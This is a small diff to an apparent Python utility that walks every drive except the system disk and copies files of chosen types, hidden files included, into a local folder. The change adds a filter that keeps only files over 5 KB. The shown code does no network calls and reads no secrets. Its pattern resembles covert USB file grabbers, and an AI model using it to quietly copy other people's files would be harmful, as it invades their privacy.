@@ -28,6 +28,11 @@ IF_SYSDISK = False
 IF_HIDENFILE = True
 #if copy the files that is hiden
 
+def filter_file(path,filename):
+    if os.path.splitext(filename)[1] in types:
+        if pathop.get_filesize(os.path.join(path,filename)) > 1024*5:
+            return True
+    return False
 
 def main():
     try:
@@ -40,7 +45,7 @@ def main():
             Drives.remove('C:\\')
     print(Drives)
     for dirPath in Drives:
-        files = pathop.getfileby_suffix(dirPath,types)
+        files = pathop.getfileby_func(dirPath,filter_file)
     try:
         for file in files:
             shutil.copy(file,'.\\Copyfile')
